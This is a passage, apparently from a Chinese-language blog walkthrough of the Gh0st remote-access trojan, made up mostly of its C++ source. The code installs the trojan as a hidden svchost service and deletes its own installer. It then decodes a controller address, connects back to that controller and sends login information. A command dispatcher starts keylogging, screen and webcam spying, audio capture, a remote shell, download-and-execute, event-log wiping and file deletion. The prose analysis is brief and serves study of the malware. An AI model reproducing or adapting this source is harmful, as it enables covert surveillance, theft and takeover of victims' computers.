class="string">&quot;Rrror in MyDecode&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>*lpServiceName = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span>*lpUpdateArgs = <span class="string">&quot;Gh0st Update&quot;</span>;</span><br><span class="line"><span class="comment">// 补丁:这里是看文件名字有没有更新(在ini配置中文件定死的)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="built_in">GetCommandLine</span>(), lpUpdateArgs) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">HANDLEhMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, <span class="literal">true</span>, lpEncodeString);</span><br><span class="line">DWORDdwLastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="comment">// 普通权限访问系统权限创建的Mutex,如果存在，如果存在就返回拒绝访问的错误</span></span><br><span class="line"><span class="comment">// 已经安装过一个一模一样配置的，就不安装了</span></span><br><span class="line"><span class="keyword">if</span> (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hMutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 等待服务端自删除</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置异常处理</span></span><br><span class="line"><span class="built_in">SetUnhandledExceptionFilter</span>(bad_exception);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确保权限</span></span><br><span class="line"><span class="built_in">SetAccessRights</span>();<span class="comment">//这里提权显示成功，但是在后续OpenSCManager中仍然存在权限不足提示</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//加载dll到svchost服务中 这里有错误，明明是创建的新服务却显示服务已存在</span></span><br><span class="line">lpServiceName = <span class="built_in">InstallService</span>(lpServiceDisplayName, lpServiceDescription, lpEncodeString);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lpServiceName != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 写安装程序路径到注册表，服务开始后读取并删除</span></span><br><span class="line"><span class="type">char</span>strSelf[MAX_PATH];</span><br><span class="line"><span class="type">char</span>strSubKey[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(strSelf, <span class="number">0</span>, <span class="built_in">sizeof</span>(strSelf));</span><br><span class="line"><span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, strSelf, <span class="built_in">sizeof</span>(strSelf));</span><br><span class="line"><span class="built_in">wsprintf</span>(strSubKey, <span class="string">&quot;SYSTEM\\CurrentControlSet\\Services\\%s&quot;</span>, lpServiceName);</span><br><span class="line"><span class="built_in">WriteRegEx</span>(HKEY_LOCAL_MACHINE, strSubKey, <span class="string">&quot;InstallModule&quot;</span>, REG_SZ, strSelf, <span class="built_in">lstrlen</span>(strSelf), <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//转接dll</span></span><br><span class="line"><span class="built_in">StartService</span>(lpServiceName);</span><br><span class="line"><span class="keyword">delete</span> lpServiceName;</span><br><span class="line"><span class="keyword">delete</span> lpServiceDisplayName;</span><br><span class="line"><span class="keyword">delete</span> lpServiceDescription;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="kGzUH">svchost</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">main</span><span class="params">(<span class="type">char</span> *lpServiceName)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">endif</span></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _CONSOLE</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage:\n %s &lt;Host&gt; &lt;Port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// lpServiceName,在ServiceMain返回后就没有了</span></span><br><span class="line"><span class="type">char</span>strServiceName[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span>strKillEvent[<span class="number">50</span>];</span><br><span class="line">HANDLEhInstallMutex = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line"><span class="type">char</span>*lpURL = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(CKeyboardManager::g_hInstance, <span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (lpURL == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Set Window Station</span></span><br><span class="line">HWINSTA hOldStation = <span class="built_in">GetProcessWindowStation</span>();</span><br><span class="line">HWINSTA hWinSta = <span class="built_in">OpenWindowStation</span>(<span class="string">&quot;winsta0&quot;</span>, FALSE, MAXIMUM_ALLOWED);</span><br><span class="line"><span class="keyword">if</span> (hWinSta != <span class="literal">NULL</span>)</span><br><span class="line"><span class="built_in">SetProcessWindowStation</span>(hWinSta);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CKeyboardManager::g_hInstance != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">SetUnhandledExceptionFilter</span>(bad_exception);</span><br><span class="line"></span><br><span class="line"><span class="built_in">lstrcpy</span>(strServiceName, lpServiceName);</span><br><span class="line"><span class="built_in">wsprintf</span>(strKillEvent, <span class="string">&quot;Global\\Gh0st %d&quot;</span>, <span class="built_in">GetTickCount</span>()); <span class="comment">// 随机事件名</span></span><br><span class="line"></span><br><span class="line">hInstallMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, <span class="literal">true</span>, lpURL);</span><br><span class="line"><span class="built_in">ReConfigService</span>(strServiceName);</span><br><span class="line"><span class="comment">// 删除安装文件 实现自隐藏</span></span><br><span class="line"><span class="built_in">DeleteInstallFile</span>(lpServiceName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人</span></span><br><span class="line"><span class="built_in">SetErrorMode</span>( SEM_FAILCRITICALERRORS);</span><br><span class="line"><span class="type">char</span>*lpszHost = <span class="literal">NULL</span>;</span><br><span class="line">DWORDdwPort = <span class="number">80</span>;</span><br><span class="line"><span class="type">char</span>*lpszProxyHost = <span class="literal">NULL</span>;</span><br><span class="line">DWORDdwProxyPort = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>*lpszProxyUser = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span>*lpszProxyPass = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">HANDLEhEvent = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">CClientSocket socketClient;</span><br><span class="line">BYTEbBreakError = NOT_CONNECT; <span class="comment">// 断开连接的原因,初始化为还没有连接</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (bBreakError != NOT_CONNECT &amp;&amp; bBreakError != HEARTBEATTIMEOUT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">hEvent = <span class="built_in">OpenEvent</span>(EVENT_ALL_ACCESS, <span class="literal">false</span>, strKillEvent);</span><br><span class="line"><span class="keyword">if</span> (hEvent != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">socketClient.<span class="built_in">Disconnect</span>();</span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">60</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line"><span class="comment">// 上线间隔为2分, 前6个&#x27;A&#x27;是标志</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">getLoginInfo</span>(<span class="built_in">MyDecode</span>(lpURL + <span class="number">6</span>), &amp;lpszHost, &amp;dwPort, &amp;lpszProxyHost, </span><br><span class="line">&amp;dwProxyPort, &amp;lpszProxyUser, &amp;lpszProxyPass))</span><br><span class="line">&#123;</span><br><span class="line">bBreakError = GETLOGINFO_ERROR;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">lpszHost = argv[<span class="number">1</span>];</span><br><span class="line">dwPort = <span class="built_in">atoi</span>(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (lpszProxyHost != <span class="literal">NULL</span>)</span><br><span class="line">socketClient.<span class="built_in">setGlobalProxyOption</span>(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">socketClient.<span class="built_in">setGlobalProxyOption</span>();</span><br><span class="line"></span><br><span class="line">DWORD dwTickCount = <span class="built_in">GetTickCount</span>();</span><br><span class="line">        <span class="comment">//连接</span></span><br><span class="line"> <span class="keyword">if</span> (!socketClient.<span class="built_in">Connect</span>(lpszHost, dwPort))</span><br><span class="line">&#123;</span><br><span class="line">bBreakError = CONNECT_ERROR;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 登录</span></span><br><span class="line">DWORD dwExitCode = SOCKET_ERROR;</span><br><span class="line"><span class="built_in">sendLoginInfo</span>(strServiceName, &amp;socketClient, <span class="built_in">GetTickCount</span>() - dwTickCount);</span><br><span class="line">        <span class="comment">//初始化manager</span></span><br><span class="line"><span class="function">CKernelManager<span class="title">manager</span><span class="params">(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort)</span></span>;</span><br><span class="line">socketClient.<span class="built_in">setManagerCallBack</span>(&amp;manager);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; (i &lt; <span class="number">10</span> &amp;&amp; !manager.<span class="built_in">IsActived</span>()); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接</span></span><br><span class="line"><span class="keyword">if</span> (!manager.<span class="built_in">IsActived</span>())</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">DWORDdwIOCPEvent;</span><br><span class="line">dwTickCount = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">hEvent = <span class="built_in">OpenEvent</span>(EVENT_ALL_ACCESS, <span class="literal">false</span>, strKillEvent);</span><br><span class="line">dwIOCPEvent = <span class="built_in">WaitForSingleObject</span>(socketClient.m_hEvent, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line">&#125; <span class="keyword">while</span>(hEvent == <span class="literal">NULL</span> &amp;&amp; dwIOCPEvent != WAIT_OBJECT_0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hEvent != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">socketClient.<span class="built_in">Disconnect</span>();</span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">SetErrorMode</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hInstallMutex);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hInstallMutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚注册进来 系统调用ServiceMain ServiceMain简单完善一下后续 然后开线程调用main</p><p>main将端口号解密出来 判断是否唯一 给自己提一个端口权限 然后重新注册一个服务 把install删了</p><p>后面把加密后的端口弄出来 然后先连随便一个网站 然后解密出来端口号等信息后面登录 在登录<code>socketClient.Connect</code>中 会有新线程产生 也就是工作线程</p><p><code>m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);</code></p><p>工作线程先接受socket 这里在没有发socket的时候会阻塞住 接受到之后就开始解析 具体逻辑还要往里进看OnRead</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WorkThread堵塞等待接收socket</span><br><span class="line">|</span><br><span class="line">OnRead判断socket是否为客户端发来的，并解包</span><br><span class="line">|</span><br><span class="line">Manager-&gt;OnReceive调用Manager下的OnReceive</span><br></pre></td></tr></table></figure><p>这里的Manager取决与前文中登录后的</p><p><code>CKernelManager manager(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);</code></p><p><code>socketClient.setManagerCallBack(&amp;manager);</code></p><p>这里实现的便是设置Manager为KernelManager<br>    所以这里调用的OnReceive就是分发Manager</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CKernelManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_ACTIVED:</span><br><span class="line">                <span class="built_in">InterlockedExchange</span>((LONG *)&amp;m_bIsActived, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_LIST_DRIVE: <span class="comment">// 文件管理</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_FileManager, </span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SCREEN_SPY: <span class="comment">// 屏幕查看</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_WEBCAM: <span class="comment">// 摄像头</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_VideoManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_AUDIO: <span class="comment">// 摄像头</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_AudioManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SHELL: <span class="comment">// 远程sehll</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_ShellManager, </span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_KEYBOARD: </span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SYSTEM: </span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_SystemManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> COMMAND_DOWN_EXEC: <span class="comment">// 下载者</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_DownManager,</span><br><span class="line">                    (LPVOID)(lpBuffer + <span class="number">1</span>), <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">Sleep</span>(<span class="number">100</span>); <span class="comment">// 传递参数用</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_OPEN_URL_SHOW: <span class="comment">// 显示打开网页</span></span><br><span class="line">                <span class="built_in">OpenURL</span>((LPCTSTR)(lpBuffer + <span class="number">1</span>), SW_SHOWNORMAL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_OPEN_URL_HIDE: <span class="comment">// 隐藏打开网页</span></span><br><span class="line">                <span class="built_in">OpenURL</span>((LPCTSTR)(lpBuffer + <span class="number">1</span>), SW_HIDE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_REMOVE: <span class="comment">// 卸载,</span></span><br><span class="line">                <span class="built_in">UnInstallService</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_CLEAN_EVENT: <span class="comment">// 清除日志</span></span><br><span class="line">                <span class="built_in">CleanEvent</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SESSION:</span><br><span class="line">                CSystemManager::<span class="built_in">ShutdownWindows</span>(lpBuffer[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_RENAME_REMARK: <span class="comment">// 改备注</span></span><br><span class="line">                <span class="built_in">SetHostID</span>(m_strServiceName, (LPCTSTR)(lpBuffer + <span class="number">1</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_UPDATE_SERVER: <span class="comment">// 更新服务端</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">UpdateServer</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>))</span><br><span class="line">                    <span class="built_in">UnInstallService</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_REPLAY_HEARTBEAT: <span class="comment">// 回复心跳包</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="k85PT">FileManager</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CFileManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> COMMAND_LIST_FILES:<span class="comment">// 获取文件列表</span></span><br><span class="line"><span class="built_in">SendFilesList</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_DELETE_FILE:<span class="comment">// 删除文件</span></span><br><span class="line"><span class="built_in">DeleteFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">SendToken</span>(TOKEN_DELETE_FINISH);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_DELETE_DIRECTORY:<span class="comment">// 删除文件</span></span><br><span class="line"><span class="comment">////printf(&quot;删除目录 %s\n&quot;, (char *)(bPacket + 1));</span></span><br><span class="line"><span class="built_in">DeleteDirectory</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">SendToken</span>(TOKEN_DELETE_FINISH);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_DOWN_FILES: <span class="comment">// 上传文件</span></span><br><span class="line"><span class="built_in">UploadToRemote</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_CONTINUE: <span class="comment">// 上传文件</span></span><br><span class="line"><span class="built_in">SendFileData</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_CREATE_FOLDER:</span><br><span class="line"><span class="built_in">CreateFolder</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_RENAME_FILE:</span><br><span class="line"><span class="built_in">Rename</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 